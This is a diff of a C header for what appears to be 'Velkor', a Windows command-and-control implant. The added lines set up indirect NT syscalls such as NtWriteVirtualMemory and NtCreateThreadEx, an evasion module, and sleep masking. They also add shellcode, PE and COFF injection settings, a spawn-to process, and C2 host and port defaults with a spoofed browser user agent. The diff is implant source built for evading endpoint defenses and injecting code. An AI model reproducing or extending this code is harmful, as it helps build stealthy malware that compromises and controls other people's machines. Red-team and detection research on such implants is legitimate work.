@@ -4,8 +4,25 @@
 #include <windows.h>
 
 #include <Misc.h>
+#include <Evasion.h>
 
-EXTERN_C typedef enum {
+typedef enum {
+    eNtOpenProcess,
+    eNtOpenThread,
+    eNtTerminateProcess,
+    eNtTerminateThread,
+    eNtCreateThreadEx,
+    eNtResumeThread,
+    eNtOpenProcessToken,
+    eNtOpenThreadToken,
+    eNtWriteVirtualMemory,
+    eNtProtectVirtualMemory,
+    eNtQueryVirtualMemory,
+    eNtFreeVirtualMemory,
+    eNtAllocateVirtualMemory
+} eINDIRECT;
+
+typedef enum {
     eMsvcrt,
     eCryptbase,
     eWs2_32,
@@ -19,12 +36,14 @@ EXTERN_C typedef enum {
     eNtdll    
 } eMODULE;
 
-#define M_ENUM_SIZE ( eNtdll + 1 )
+#define SYS_ENUM_SIZE ( eNtAllocateVirtualMemory + 1 )
+#define M_ENUM_SIZE   ( eNtdll + 1 )
+#define COFF_LEN      17
 
 EXTERN_C typedef enum {
-    VelkorWinApi,
-    VelkorNtApi,
-    VelkorIndirect
+    VkCallWinApi,
+    VkCallNtApi,
+    VkCallIndirect
 } eSYSCALL;
 
 /*==============[ Dereference ]==============*/
@@ -72,43 +91,37 @@ EXTERN_C PVOID EndPtr();
 #define InstanceOffset()  ( U_64( &__Instance_offset ) )
 #define InstancePtr()     ( ( PVELKOR ) C_DEF( C_PTR( U_64( StartPtr() ) ) + InstanceOffset() ) ) 
 #define Velkor            ( ( PVELKOR ) __LocalInstance )
+
 #define VELKOR_INSTANCE   PVELKOR __LocalInstance = InstancePtr();
+
 #define SYSCALL_METHOD    Velkor->Session.SyscallMethod
 #define VELKOR_PACKAGE    Velkor->CommunicConfig.PackagePtr
-#define VelkorMem         Velkor->VelkorMemory
-#define SleepConf         Velkor->SleepConfig
-#define FuncPtr           Velkor->FunctionPtr
-#define ForkConf          Velkor->ForkConfig
-#define WebConf           Velkor->CommunicConfig.WebConfig
 
-#define RBX_REG         0x23
-#define PAGE_SIZE       0x1000 
-#define STATIC          static
-#define NO_INLINE       __attribute__( ( noinline ) )
-#define INLINE          inline
+#define VelkorMem         Velkor->VelkorMemory
+#define TaskMgmt          Velkor->TaskManager
+#define SleepConf         Velkor->SleepConfig
+#define FuncPtr           Velkor->VkWin32.FunctionPtr
+#define CoffCtx           Velkor->PostEx.zCoffCtx
+#define PsCtx             Velkor->PostEx.ProcessCtx
+#define InjCtx            Velkor->PostEx.InjectionCtx
+#define WebConf           Velkor->CommunicConfig.WebConfig
+#define VkSys             Velkor->VkWin32.VkSyscall
+
+#define VELKOR_MAGIC_VALUE  0x71717171
+#define RBX_REG             0x23
+#define PAGE_SIZE           0x1000 
+#define STATIC              static
+#define INLINE              inline
+#define FORCE_INLINE        __forceinline
+#define NO_INLINE           __attribute__( ( noinline ) )
+
 #define D_API( x )      __typeof__( x ) * x
 #define D_SEC( x )      __attribute__( ( section( ".text$" #x "" ) ) )
+
 #define ST_GLOBAL       __attribute__( ( section( ".global" ) ) )
 #define ST_READONLY     __attribute__( ( section( ".rdata" ) ) )
+
 #define PAGE_ALIGN( x ) ( ( (ULONG_PTR) x ) + ( ( PAGE_SIZE - ( ( (ULONG_PTR)x ) & ( PAGE_SIZE - 1 ) ) ) % PAGE_SIZE ) )
-
-/*==============[ Velkor Config ]==============*/
-
-#ifndef HOST_CONFIG
-#define HOST_CONFIG  L"127.0.0.1"
-#endif
-
-#ifndef PORT_CONFIG
-#define PORT_CONFIG 80
-#endif
-
-#ifndef USER_AGENT_CONFIG
-#define USER_AGENT_CONFIG L""
-#endif
-
-#ifndef ADD_HEADERS_CONFIG
-#define ADD_HEADERS_CONFIG L""
-#endif
 
 /*==============[ Namespace Velkor Macros ]==============*/
 
@@ -123,7 +136,7 @@ EXTERN_C PVOID EndPtr();
 /*==============[ Debug ]==============*/
 
 #ifdef DEBUG
-    #define VkShow( x, ... ) Velkor->FunctionPtr.printf( x, ##__VA_ARGS__ )
+    #define VkShow( x, ... ) Velkor->VkWin32.FunctionPtr.printf( x, ##__VA_ARGS__ )
 #else
     #define VkShow( x, ... ) 
 #endif
@@ -142,12 +155,48 @@ EXTERN_C PVOID EndPtr();
 #define VK_SYSCALL_METHOD 0
 #endif  
 
-#ifndef VK_SLEEP_TECHNIQUE
-#define VK_SLEEP_TECHNIQUE 0
+#ifndef VK_SLEEP_MASK
+#define VK_SLEEP_MASK 0
+#endif
+
+#ifndef VK_SPAWNTO
+#define VK_SPAWNTO ""
+#endif
+
+#ifndef VK_PS_TYPE
+#define VK_PS_TYPE 0
 #endif
 
 #ifndef VK_SLEEP_TIME
 #define VK_SLEEP_TIME 5
+#endif
+
+#ifndef VK_SC_INJ_T
+#define VK_SC_INJ_T 0
+#endif
+
+#ifndef VK_PE_INJ_T
+#define VK_PE_INJ_T 0
+#endif
+
+#ifndef VK_COFF_INJ_T
+#define VK_COFF_INJ_T 0
+#endif
+
+#ifndef HOST_CONFIG
+#define HOST_CONFIG  L"127.0.0.1"
+#endif
+
+#ifndef PORT_CONFIG
+#define PORT_CONFIG 80
+#endif
+
+#ifndef USER_AGENT_CONFIG
+#define USER_AGENT_CONFIG L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+#endif
+
+#ifndef ADD_HEADERS_CONFIG
+#define ADD_HEADERS_CONFIG L""
 #endif
 
 #endif // MACROS_H
